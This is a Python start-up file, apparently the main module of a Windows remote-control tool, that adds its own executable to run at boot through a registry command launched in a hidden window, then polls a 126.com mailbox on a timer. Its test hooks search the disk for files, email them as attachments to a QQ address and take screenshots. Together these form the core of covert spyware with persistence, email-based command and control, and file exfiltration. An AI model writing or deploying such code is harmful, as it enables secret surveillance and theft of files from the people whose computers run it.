# coding: utf-8

'Start file of this project'

import searchTool, readEmail, time, sendEmail, screenshot
import smtplib, os, sys, subprocess
from threading import Timer
from constant import Constant as C

class Main(object):

    def __init__(self, timer_interval, email, pwd, pop3_server, searchPath):
        self.timer_interval = timer_interval
        self.email = email
        self.pwd = pwd
        self.pop3_server = pop3_server
        self.searchPath = searchPath
        self.IS_WIN32 = 'win32' in str(sys.platform).lower() 

    def __testSearchTool(self):
        searchPath = C.SEARCH_PATH
        searchFile = C.SEARCH_FILE
        searchName = False
        if len(searchFile.split(".")) == 1:
            searchName = True
        st = searchTool.SearchTool(searchPath, searchFile, searchName)
        st.parsePath(st.searchPath)

    def __testReadEmail(self):
        email = C.EMAIL_126
        pwd = C.PWD
        pop3_server = C.POP3_126_SERVER
        searchPath = C.SEARCH_PATH
        re = readEmail.ReadEmail(email, pwd, pop3_server, searchPath)
        content = re.downloadEmail()
        msg = re.parseContent(content)
        re.print_info(msg)

    def __testSendEmail(self):
        from_addr = C.EMAIL_126
        password = C.PWD
        to_addr = C.EMAIL_QQ
        smtp_server = C.SMTP_126_SERVER
        subject = C.TEST_SUBJECT
        attachs = C.TEST_ATTACHS
        se = sendEmail.SendEmail(from_addr, password, to_addr, smtp_server, subject, attachs)
        se.send()

    def __testScreenshot(self):
        if __name__ == "__main__":
            ss = screenshot.ScreenShot(5)
            ss.grab()

    def __runWhenStart(self):
        curr = os.path.abspath(".")
        dirs = os.listdir(curr)
        mainLink = os.path.join(curr, "main.exe")
        self.__subprocess_call(C.START_REGEDIT + mainLink)
    
    def __subprocess_call(self, *args, **kwargs):  
        if self.IS_WIN32:  
            startupinfo = subprocess.STARTUPINFO()  
            startupinfo.dwFlags = subprocess.CREATE_NEW_CONSOLE | subprocess.STARTF_USESHOWWINDOW  
            startupinfo.wShowWindow = subprocess.SW_HIDE  
            kwargs['startupinfo'] = startupinfo  
        retcode = subprocess.call(*args, **kwargs)  
        return retcode  

    def run(self):
        #**********Run code***************************
        self.__runWhenStart()
        re = readEmail.ReadEmail(email, pwd, pop3_server, searchPath)
        content = re.downloadEmail()
        msg = re.parseContent(content)
        re.print_info(msg)
        if C.INTERVAL:
            t = Timer(main.timer_interval, self.run)
            t.start()
        #**********************************************

        #************Test case*************************
        # self.__testSearchTool()
        # self.__testSendEmail()
        #self.__testReadEmail()
        #sself.__testScreenshot()
        #**********************************************

timer_interval = C.MAIN_INTERVAL
email = C.EMAIL_126
pwd = C.PWD
pop3_server = C.POP3_126_SERVER
searchPath = C.SEARCH_PATH

main = Main(timer_interval, email, pwd, pop3_server, searchPath)
t = Timer(60 * 5,main.run)
t.start()